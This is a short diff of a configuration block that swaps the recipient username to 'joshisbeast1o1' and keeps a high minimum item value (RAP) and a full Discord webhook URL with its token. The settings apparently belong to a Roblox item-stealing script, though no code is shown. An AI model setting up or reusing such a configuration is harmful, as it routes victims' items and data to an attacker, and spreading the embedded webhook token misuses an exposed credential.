@@ -1,5 +1,5 @@
-Username = "Geist"
-Username2 = "Geist"
+Username = "joshisbeast1o1"
+Username2 = "joshisbeast1o1"
 MinimumRAP = 10000000
 Webhook = "https://discordapp.com/api/webhooks/1357896252620275806/AqQLuznYAVnaHEOZ6o91XLuUn-mDl08UaPcE2dFgfri2v6aivRzUjwj8WG-G7gGcErg0"
 
